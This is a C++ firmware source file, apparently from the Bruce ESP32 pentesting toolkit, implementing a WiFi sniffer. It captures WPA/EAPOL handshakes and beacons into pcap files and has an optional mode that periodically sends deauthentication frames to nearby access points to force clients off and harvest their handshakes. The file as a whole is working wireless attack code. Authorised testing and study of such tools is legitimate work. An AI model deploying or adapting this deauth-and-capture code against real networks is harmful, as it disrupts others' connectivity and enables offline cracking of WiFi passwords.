/*
  ===========================================
       Copyright (c) 2017 Stefan Kremser
              github.com/spacehuhn
  ===========================================
*/
#include "sniffer.h"
/* include all necessary libraries */
#include "esp_wifi.h"
#include "freertos/FreeRTOS.h"
// #include "esp_wifi_internal.h"
#include "esp_event.h"
#include "esp_system.h"
#include "lwip/err.h"
// #include "esp_event_loop.h"
#include "driver/gpio.h"
#include "nvs_flash.h"
#include <set>

#include "FS.h"
#include "core/display.h"
#include "core/mykeyboard.h"
#include "core/sd_functions.h"
#include "core/wifi/wifi_common.h"
#include <Arduino.h>
#include <TimeLib.h>
#include <globals.h>
#if defined(ESP32)
#include "FS.h"
// #include "SD.h"
#else
#include <SPI.h>
#include <SdFat.h>
#endif
#include "modules/wifi/wifi_atks.h" // to use deauth frames and cmds

//===== SETTINGS =====//
#define CHANNEL 1
#define FILENAME "raw_"
#define SAVE_INTERVAL 10     // save new file every 30s
#define CHANNEL_HOPPING true // if true it will scan on all channels
#define MAX_CHANNEL 12       //(only necessary if channelHopping is true)
#define HOP_INTERVAL 214     // in ms (only necessary if channelHopping is true)
#define DEAUTH_INTERVAL (15*1000)  //Send deauth packets every ms
#define EAPOL_ONLY true

//===== Run-Time variables =====//
unsigned long lastTime = 0;
unsigned long lastChannelChange = 0;
uint32_t lastRedraw = 0;
uint8_t ch = CHANNEL;
bool fileOpen = false;
bool isLittleFS = true;
bool _only_HS = EAPOL_ONLY; // option to only save handshakes and EAPOL pcaps
int num_EAPOL = 0;
int num_HS = 0;
uint32_t packet_counter = 0;
uint32_t deauth_counter = 0;
uint32_t beacon_frames  = 0;
uint32_t start_time     = 0;
long     deauth_tmp = 0;

File _pcap_file;
std::set<BeaconList> registeredBeacons;
std::set<String> SavedHS; // Saves the MAC of beacon HS detected in the session
String filename = "/BrucePCAP/" + (String)FILENAME + ".pcap";

//===== FUNCTIONS =====//

// Thank you 7h30th3r0n3 for helping me solve this issue! and for sharing your EAPOL/Handshake sniffer
// please, give stars to his project: https://github.com/7h30th3r0n3/Evil-M5Core2/

// Handshake detection
bool isItEAPOL(const wifi_promiscuous_pkt_t *packet) {
    const uint8_t *payload = packet->payload;
    int len = packet->rx_ctrl.sig_len;

    // length check to ensure packet is large enough for EAPOL (minimum length)
    if (len < (24 + 8 + 4)) { // 24 bytes for the MAC header, 8 for LLC/SNAP, 4 for EAPOL minimum
        return false;
    }

    // check for LLC/SNAP header indicating EAPOL payload
    // LLC: AA-AA-03, SNAP: 00-00-00-88-8E for EAPOL
    if (payload[24] == 0xAA && payload[25] == 0xAA && payload[26] == 0x03 && payload[27] == 0x00 &&
        payload[28] == 0x00 && payload[29] == 0x00 && payload[30] == 0x88 && payload[31] == 0x8E) {
        return true;
    }

    // handle QoS tagging which shifts the start of the LLC/SNAP headers by 2 bytes
    // check if the frame control field's subtype indicates a QoS data subtype (0x08)
    if ((payload[0] & 0x0F) == 0x08) {
        // Adjust for the QoS Control field and recheck for LLC/SNAP header
        if (payload[26] == 0xAA && payload[27] == 0xAA && payload[28] == 0x03 && payload[29] == 0x00 &&
            payload[30] == 0x00 && payload[31] == 0x00 && payload[32] == 0x88 && payload[33] == 0x8E) {
            return true;
        }
    }

    return false;
}
// Définition de l'en-tête d'un paquet PCAP
typedef struct pcaprec_hdr_s {
    uint32_t ts_sec;   /* timestamp secondes */
    uint32_t ts_usec;  /* timestamp microsecondes */
    uint32_t incl_len; /* nombre d'octets du paquet enregistrés dans le fichier */
    uint32_t orig_len; /* longueur réelle du paquet */
} pcaprec_hdr_t;

void saveHandshake(const wifi_promiscuous_pkt_t *packet, bool beacon, FS &Fs) {
    // Construire le nom du fichier en utilisant les adresses MAC de l'AP et du client
    const uint8_t *addr1 = packet->payload + 4;  // Adresse du destinataire (Adresse 1)
    const uint8_t *addr2 = packet->payload + 10; // Adresse de l'expéditeur (Adresse 2)
    const uint8_t *bssid = packet->payload + 16; // Adresse BSSID (Adresse 3)
    const uint8_t *apAddr;

    if (memcmp(addr1, bssid, 6) == 0) {
        apAddr = addr1;
    } else {
        apAddr = addr2;
    }

    char nomFichier[50];
    sprintf(
        nomFichier,
        "/BrucePCAP/handshakes/HS_%02X%02X%02X%02X%02X%02X.pcap",
        apAddr[0],
        apAddr[1],
        apAddr[2],
        apAddr[3],
        apAddr[4],
        apAddr[5]
    );

    // Vérifier si le fichier existe déjà
    bool fichierExiste = false;

    // Check if the MAC Address was registered in the list
    if (SavedHS.find(String((char *)apAddr, 6)) != SavedHS.end()) { fichierExiste = true; }

    // Si probe est true et que le fichier n'existe pas, ignorer l'enregistrement
    if (beacon && !fichierExiste) { return; }

    // Ouvrir le fichier en mode ajout si existant sinon en mode écriture
    File fichierPcap = Fs.open(
        nomFichier, fichierExiste ? FILE_APPEND : FILE_WRITE
    ); // if the file already exists in the new session, will overwrite it
    if (!fichierPcap) {
        Serial.println("Fail creating the EAPOL/Handshake PCAP file");
        return;
    }

    if (!beacon && !fichierExiste) {
        // Serial.println("New EAPOL/Handshake PCAP file, writing header");
        SavedHS.insert(String((char *)apAddr, 6));
        num_HS++;
        writeHeader(fichierPcap);
    }
    if (beacon && fichierExiste) {
        BeaconList ThisBeacon;
        memcpy(ThisBeacon.MAC, (char *)apAddr, 6);
        ThisBeacon.channel = ch;
        if (registeredBeacons.find(ThisBeacon) != registeredBeacons.end()) {
            return; // Beacon déjà enregistré pour ce BSSID
        }
        registeredBeacons.insert(ThisBeacon); // Ajouter le BSSID à l'ensemble
    }

    // Écrire l'en-tête du paquet et le paquet lui-même dans le fichier
    pcaprec_hdr_t pcap_packet_header;
    pcap_packet_header.ts_sec = packet->rx_ctrl.timestamp / 1000000;
    pcap_packet_header.ts_usec = packet->rx_ctrl.timestamp % 1000000;
    pcap_packet_header.incl_len = packet->rx_ctrl.sig_len;
    pcap_packet_header.orig_len = packet->rx_ctrl.sig_len;
    fichierPcap.write((const byte *)&pcap_packet_header, sizeof(pcaprec_hdr_t));
    fichierPcap.write(packet->payload, packet->rx_ctrl.sig_len);
    fichierPcap.close();
}

void printAddress(const uint8_t *addr) {
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", addr[i]);
        if (i < 5) Serial.print(":");
    }
    Serial.println();
}

/* write packet to file */
void newPacketSD(uint32_t ts_sec, uint32_t ts_usec, uint32_t len, uint8_t *buf, File pcap_file) {
    if (pcap_file) {

        uint32_t orig_len = len;
        uint32_t incl_len = len;
        // if(incl_len > snaplen) incl_len = snaplen; /* safty check that the packet isn't too big (I ran into
        // problems here) */

        pcap_file.write((uint8_t *)&ts_sec, sizeof(ts_sec));
        pcap_file.write((uint8_t *)&ts_usec, sizeof(ts_usec));
        pcap_file.write((uint8_t *)&incl_len, sizeof(incl_len));
        pcap_file.write((uint8_t *)&orig_len, sizeof(orig_len));

        pcap_file.write(buf, incl_len);
    }
}

bool writeHeader(File file) {
    uint32_t magic_number = 0xa1b2c3d4;
    uint16_t version_major = 2;
    uint16_t version_minor = 4;
    uint32_t thiszone = 0;
    uint32_t sigfigs = 0;
    uint32_t snaplen = 2500;
    uint32_t network = 105;

    if (file) {

        file.write((uint8_t *)&magic_number, sizeof(magic_number));
        file.write((uint8_t *)&version_major, sizeof(version_major));
        file.write((uint8_t *)&version_minor, sizeof(version_minor));
        file.write((uint8_t *)&thiszone, sizeof(thiszone));
        file.write((uint8_t *)&sigfigs, sizeof(sigfigs));
        file.write((uint8_t *)&snaplen, sizeof(snaplen));
        file.write((uint8_t *)&network, sizeof(network));

        return true;
    }
    return false;
}

/* will be executed on every packet the ESP32 gets while beeing in promiscuous mode */
// Sniffer callback
void sniffer(void *buf, wifi_promiscuous_pkt_type_t type) {
    // If using LittleFS to save .pcaps and there's no room for data, don't do anything whith new packets
  
    if (isLittleFS && !checkLittleFsSizeNM()) {
        returnToMenu = true;
        esp_wifi_set_promiscuous(false);
        return;
    }
    wifi_promiscuous_pkt_t *pkt = (wifi_promiscuous_pkt_t *)buf;
    wifi_pkt_rx_ctrl_t ctrl = (wifi_pkt_rx_ctrl_t)pkt->rx_ctrl;

    const uint8_t *frame = pkt->payload;
    const uint16_t frameControl = (uint16_t)frame[0] | ((uint16_t)frame[1] << 8);
    const uint8_t frameType = (frameControl & 0x0C) >> 2;
    const uint8_t frameSubType = (frameControl & 0xF0) >> 4;

    packet_counter++;
    
    if (isItEAPOL(pkt)) {
        // if(_only_HS) newPacketSD(timestamp, microseconds, len, pkt->payload, _pcap_file);
        num_EAPOL++;
        // Serial.println("EAPOL detected.");
        const uint8_t *receiverAddr = frame + 4;
        const uint8_t *senderAddr = frame + 10;
        // Serial.print("Address MAC destination: ");
        // printAddress(receiverAddr);
        // Serial.print("Address MAC expedition: ");
        // printAddress(senderAddr);
        if (isLittleFS) saveHandshake(pkt, false, LittleFS);
        else saveHandshake(pkt, false, SD);
    }

    // Beacon frame
    if (frameType == 0x00 && frameSubType == 0x08) {
        const uint8_t *senderAddr = frame + 10; // Beacon source address
	beacon_frames++;
        
        pkt->rx_ctrl.sig_len -= 4; // cut off last 4 b
        // save the packet
        if(isLittleFS) saveHandshake(pkt, true, LittleFS);
	else           saveHandshake(pkt, true, SD);

	//Save beacon to the list
	BeaconList ThisBeacon;
        memcpy(ThisBeacon.MAC, (char *)senderAddr, 6);
        ThisBeacon.channel = ch;
	//Check if already registered
        if (registeredBeacons.find(ThisBeacon) != registeredBeacons.end()) {
	  return;
        }
        registeredBeacons.insert(ThisBeacon); // add to the list
    }
    
    // If we just want handshakes, quit now
    if(_only_HS) return;
    
    if (fileOpen) {
        uint32_t timestamp = now();                                         // current timestamp
        uint32_t microseconds = (unsigned int)(micros() - millis() * 1000); // microseconds offset (0 - 999)

        uint32_t len = ctrl.sig_len;
        if (type == WIFI_PKT_MGMT) {
            len -= 4; // Remove last 4 bytes (for checksum) or packet gets malformed 
                      // https://github.com/espressif/esp-idf/issues/886
        }
        newPacketSD(
            timestamp, microseconds, len, pkt->payload, _pcap_file
		    ); // write packet to sd
    }
}

// esp_err_t event_handler(void *ctx, system_event_t *event){ return ESP_OK; }
void event_handler(void *arg, esp_event_base_t event_base, int32_t event_id, void *event_data) {
    if (event_base == WIFI_EVENT) {
        switch (event_id) {
            case WIFI_EVENT_STA_START:
                // Ação para quando a estação WiFi inicia
                break;
                // Outros casos...
        }
    } else if (event_base == IP_EVENT) {
        switch (event_id) {
            case IP_EVENT_STA_GOT_IP:
                // Ação para quando a estação WiFi obtém um endereço IP
                break;
                // Outros casos...
        }
    }
}

/* opens a new file */
int c = 0;

void openFile(FS &Fs) {
    // searches for the next non-existent file name
    if (!Fs.exists("/BrucePCAP")) Fs.mkdir("/BrucePCAP");
    filename = "/BrucePCAP/" + (String)FILENAME + (String)c + ".pcap";
    while (Fs.open(filename)) {
        filename = "/BrucePCAP/" + (String)FILENAME + (String)c + ".pcap";
        c++;
    }
    if (!Fs.exists("/BrucePCAP/handshakes")) Fs.mkdir("/BrucePCAP/handshakes");
    _pcap_file = Fs.open(filename, FILE_WRITE);
    if (_pcap_file) {
        fileOpen = writeHeader(_pcap_file);
        // Serial.println("opened: " + filename);
    } else {
        fileOpen = false;
        Serial.println("Fail opening the file");
    }
}

//===== SETUP =====//
void sniffer_setup() {
    FS *Fs;
    int redraw = true;
    String FileSys = "LittleFS";
    bool deauth = false;
    start_time = millis();
    drawMainBorderWithTitle("pcap sniffer");
    lastRedraw = millis();
    // closeSdCard();

    if (setupSdCard()) {
        Fs = &SD; // if SD is present and mounted, start writing on SD Card
        FileSys = "SD";
        isLittleFS = false;
    } else Fs = &LittleFS; // if not, use the internal memory.

    openFile(*Fs);
    displayTextLine("Sniffing Started");
    tft.setTextSize(FP);
    tft.setCursor(80, 100);

    SavedHS.clear(); // Need to clear to restart HS count
    registeredBeacons.clear();
    /* setup wifi */
    nvs_flash_init();
    ESP_ERROR_CHECK(esp_netif_init()); // novo
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    ESP_ERROR_CHECK(esp_wifi_init(&cfg));
    ESP_ERROR_CHECK(esp_wifi_set_storage(WIFI_STORAGE_RAM));

    wifi_config_t wifi_config;
    strcpy((char *)wifi_config.ap.ssid, "BruceSniffer");
    strcpy((char *)wifi_config.ap.password, "brucenet");
    wifi_config.ap.ssid_len = strlen("BruceSniffer");
    wifi_config.ap.channel = 1;                   // Channel
    wifi_config.ap.authmode = WIFI_AUTH_WPA2_PSK; // auth mode
    wifi_config.ap.ssid_hidden = 1;               // 1 to hidden SSID, 0 to visivle
    wifi_config.ap.max_connection = 2;            // Max connections
    wifi_config.ap.beacon_interval = 100;         // beacon interval in ms

    // Configura o modo AP
    ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_AP));
    ESP_ERROR_CHECK(esp_wifi_set_config(WIFI_IF_AP, &wifi_config));
    ESP_ERROR_CHECK(esp_wifi_start());
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_promiscuous_rx_cb(sniffer);
    wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
    esp_wifi_set_channel(ch, secondCh);

    Serial.println("Sniffer started!");
    vTaskDelay(1000 / portTICK_RATE_MS);

    if (isLittleFS && !checkLittleFsSize()) goto Exit;
    num_EAPOL = 0;
    num_HS = 0;
    packet_counter = 0;
    deauth_tmp = millis();
    // Prepare deauth frame for each AP record
    memcpy(deauth_frame, deauth_frame_default, sizeof(deauth_frame_default));
    // Main sniffer loop

    for (;;) {
        if (returnToMenu) { // if it happpend, liffle FS is full;
            Serial.println("Not enough space on LittleFS");
            displayError("LittleFS Full", true);
            break;
        }
        unsigned long currentTime = millis();

        /* Channel Hopping */
        if (check(NextPress)) {
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            ch++; // increase channel
            if (ch > MAX_CHANNEL) ch = 1;
            wifi_second_chan_t secondCh = (wifi_second_chan_t)NULL;
            esp_wifi_set_channel(ch, secondCh);
            redraw = true;
            vTaskDelay(50 / portTICK_RATE_MS);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(sniffer);
        }

        if (PrevPress) {
#if !defined(HAS_KEYBOARD) && !defined(HAS_ENCODER)
            LongPress = true;
            long _tmp = millis();
            while (PrevPress) {
                if (millis() - _tmp > 150)
                    tft.drawArc(
                        tftWidth / 2,
                        tftHeight / 2,
                        25,
                        15,
                        0,
                        360 * (millis() - _tmp) / 700,
                        getColorVariation(bruceConfig.priColor),
                        bruceConfig.bgColor
                    );
                vTaskDelay(10 / portTICK_RATE_MS);
            }
            if (millis() - _tmp > 700) { // longpress detected to exit
                returnToMenu = true;
                _pcap_file.close();
                break;
            }
#endif
            check(PrevPress);
            esp_wifi_set_promiscuous(false);
            esp_wifi_set_promiscuous_rx_cb(nullptr);
            ch--; // increase channel
            if (ch < 1) ch = MAX_CHANNEL;
            // Serial.println(ch);
            wifi_second_chan_t secondCh = (wifi_second_chan_t) NULL;
            esp_wifi_set_channel(ch, secondCh);
            redraw = true;
            vTaskDelay(50 / portTICK_PERIOD_MS);
            esp_wifi_set_promiscuous(true);
            esp_wifi_set_promiscuous_rx_cb(sniffer);
        }

#if defined(HAS_KEYBOARD) ||                                                                                 \
    defined(                                                                                                 \
        T_EMBED                                                                                              \
    ) // T-Embed has a different btn for Escape, different from StickCs that uses Previous btn
        if (check(EscPress)) { // Apertar o botão power ou Esc
            returnToMenu = true;
            _pcap_file.close();
            break;
        }
#endif

	if (check(SelPress)) { // pressed ok - show menu
                options = {
                    {"New File",
                     [=]() {
                         if (_pcap_file) { // for the first run, only draws the screen, after that, changes
                                           // files
                             _pcap_file.flush(); // save file
                             // Serial.println("==================");
                             // Serial.println(filename + " saved!");
                             // Serial.println("==================");
                             fileOpen = false; // update flag
                             _pcap_file.close();
                             c++;           // add to filename
                             openFile(*Fs); // open new file
                         }
                     }                                                                          },
                    {deauth ? "Disable deauth" : "Enable deauth",      [&]() { deauth = !deauth; }    },
                    {_only_HS ? "All packets" : "EAPOL/HS only", [=]() { _only_HS = !_only_HS; }},
                    {"Reset Counters",
                     [=]() {
                         packet_counter = 0;
                         num_EAPOL = 0;
                         num_HS = 0;
			 start_time = millis();
			 beacon_frames = 0;
			 registeredBeacons.clear();
			 deauth_tmp = millis();
			 
                     }                                                                          },
                    {"Exit Sniffer",                             [=]() { returnToMenu = true; } },
                };
                loopOptions(options);
            }
	
        if (redraw) { // Redraw UI
	  redraw = false;

	  vTaskDelay(200 / portTICK_PERIOD_MS);

	  //calculate run time
	  uint32_t runtime = (millis() - start_time)/1000;
	    
	  if (returnToMenu) goto Exit;
	  tft.drawPixel(0, 0, 0);
	  drawMainBorderWithTitle("pcap sniffer"); // Clear Screen and redraw border
	  tft.setTextSize(FP);
	  tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);
	  padprintln("File: " + FileSys + ":" + filename);
	  padprintln("Sniffer Mode: " + String(_only_HS ? "Only EAPOL/HS" : "All packets"));
	  if(deauth){
	    tft.setTextColor(bruceConfig.bgColor, bruceConfig.priColor);
	    padprintln(
		       "Deauth: in " + String((DEAUTH_INTERVAL - (millis() - deauth_tmp))/1000) + "s, total " \
		       + String(deauth_counter) + " pkts sent");
	    tft.setTextColor(bruceConfig.priColor, bruceConfig.bgColor);

	  } else padprintln("Silent mode.");
	  padprintln("Run time " + String(runtime/60) + ":" + String(runtime%60));
	  //padprintln("millis=" + String(millis()));
	  padprintln("Beacons " + String(beacon_frames) + " tot. /" + String(registeredBeacons.size()) + " in mem.");

	  // make a nice reverse video bar
	  tft.setTextColor(bruceConfig.bgColor, bruceConfig.priColor);
	  tft.drawRightString(
			      "Ch" + String(ch < 10 ? "0" : "") + String(ch) + " (Next)", tftWidth - 10, tftHeight - 18, 1
			      );
	  tft.drawString(" EAPOL: " + String(num_EAPOL) + " HS: " + String(num_HS) + " ", 10, tftHeight - 18);
	  tft.drawCentreString("Packets " + String(packet_counter), tftWidth / 2, tftHeight - 26, 1);

	}

	if (currentTime - lastTime > 100) tft.drawPixel(0, 0, 0);

        if (fileOpen && currentTime - lastTime > 1000) {
	  _pcap_file.flush();     // save file
            lastTime = currentTime; // update time
            
        }

        if (deauth && (millis() - deauth_tmp) > DEAUTH_INTERVAL) {
	  bool deauth_sent = false;
            if (registeredBeacons.size() > 40)
                registeredBeacons.clear(); // Clear registered beacons to restart search and avoid restarts
            Serial.println("<<---- Starting Deauthentication Process ---->>");
            for (auto registeredBeacon : registeredBeacons) {
                if (registeredBeacon.channel == ch) {
                    memcpy(&ap_record.bssid, registeredBeacon.MAC, 6);
                    wsl_bypasser_send_raw_frame(
                        &ap_record, registeredBeacon.channel
                    ); // writes the buffer with the information
		    //XXX: ap_record reused between this and wifi_atks.h
                    send_raw_frame(deauth_frame, 26);
		    deauth_sent = true; deauth_counter++;
                    vTaskDelay(2 / portTICK_RATE_MS);
                }
            }
	    if(deauth_sent) tft.drawString("Deauth sent.", 10, tftHeight - 14);

            deauth_tmp = millis();
        }
	//TODO: display a count of wifi networks on the selected channel (count registeredBeacons)
	//TODO: store a last-seen millis value for each beacon, update it whenever its seen, delete beacon after not hearing
	//TODO: maybe show a list of SSIDs?
	
	if(millis() - lastRedraw > 1000) {
	  redraw = true;
	  lastRedraw = millis();
	}
        vTaskDelay(100 / portTICK_PERIOD_MS);
    }
Exit:
    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_deinit();
    wifiDisconnect();
    vTaskDelay(1 / portTICK_RATE_MS);
}

void setHandshakeSniffer() {
    esp_wifi_set_promiscuous_rx_cb(NULL);
    esp_wifi_set_promiscuous_rx_cb(sniffer);
}
